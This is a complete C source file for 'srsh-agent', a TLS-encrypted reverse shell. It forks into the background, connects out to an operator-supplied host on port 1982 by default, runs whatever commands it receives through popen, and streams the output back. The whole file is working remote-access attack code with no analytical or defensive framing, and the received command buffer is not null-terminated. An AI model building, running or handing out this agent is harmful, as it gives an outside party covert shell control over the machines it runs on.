/*      srsh-agent.c Copyright 2024 Srdjan Rajcevic <srdjan.rajcevic[OF]sectreme.com>
*/
#include <stdio.h>
#include <stdlib.h>
#include <strings.h>
#include <unistd.h>
#include <openssl/ssl.h>
#include <openssl/stack.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <errno.h>
/* Default port if not specified via -p */
char *port = "1982";

#if __OpenBSD__
void usage(void);
#elif __linux
void usage(char *progname);
#endif

int
main(int argc, char *argv[])
{
	int ch;
	char *host = NULL;
	while((ch = getopt(argc, argv, "p:")) != -1) 
                switch(ch)
                {
                case 'p':
                        port = optarg;
                        break;
                case '?':
#if __OpenBSD__			
			usage();
#elif __linux__
			usage(argv[0]);
#endif
                        return 1;
                }	
        if ((optind == 1) && (argv[1] == NULL))
        {
#if __OpenBSD__
                usage();
#elif __linux__
		usage(argv[0]);
#endif
                return 1;
        }
	else if (optind == 1)
		host = argv[1];
	else host = argv[3];
        argc -= optind;
        argv += optind;
	pid_t pid = fork();
	if (pid == -1) {
		write(2, "[ERROR] fork failed.\n", 21);
		return 1;
	}
	if (pid > 0) {
		return 0;
	}
	int sockfd;
        const SSL_METHOD *method = TLS_method();
        SSL_CTX *ctx;
        ctx = SSL_CTX_new(method);
        if (ctx == NULL)
        {
                printf("Cannot create context [%d]\n", errno);
                return 1;
        }
        SSL_CTX_set_options(ctx, SSL_OP_ALL);
	SSL *connection = SSL_new(ctx);
        if (connection == NULL)
        {
                printf("Cannot create connection [%d]\n", errno);
                return 1;
        }
	sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0)
        {
                printf("Cannot create socket [%d]\n", errno);
                return 1;
        }
        struct addrinfo hints, *res;
        memset (&hints, 0, sizeof(hints));
        hints.ai_family = AF_UNSPEC;
        hints.ai_socktype = SOCK_STREAM;
        hints.ai_protocol = 0;
        hints.ai_flags = AI_PASSIVE;
        int g_res = getaddrinfo(host, port, &hints, &res);
	if (g_res != 0)
        {
                printf("getaddrinfo [%d]\n", errno);
                return 1;
        }
	if ((g_res = connect(sockfd, res->ai_addr,
				res->ai_addrlen)) < 0) {
		printf("Connection failed [%d]\n", errno);
		return 1;
	}
	SSL_set_fd(connection, sockfd);
	if ((g_res = SSL_connect(connection)) != 1) {
		printf("TLS handshake failed [%d]\n", g_res);
		return 1;
	}
	size_t ret;
	char command[256];
	char in_ch;
	FILE *po_fd;
	while(1) {
		g_res = SSL_read(connection, (char*)command, sizeof(command));
		if (g_res <= 0)
			break;
		po_fd = popen(command, "r");
		while(!feof(po_fd)) {
			ret = fread(&in_ch, 1, sizeof(in_ch), po_fd);
			SSL_write(connection, &in_ch, sizeof(in_ch));
		}
		pclose(po_fd);
	}
	SSL_free(connection);
	SSL_CTX_free(ctx);
	return 0;
}
#if __OpenBSD__
void
usage()
{
        printf("Usage:  %s [-p port] ip/fqdn\n", getprogname());
}
#elif __linux__
void
usage(char *progname)
{
	printf("Usage:  %s [-p port] ip/fqdn\n", progname);
}
#endif
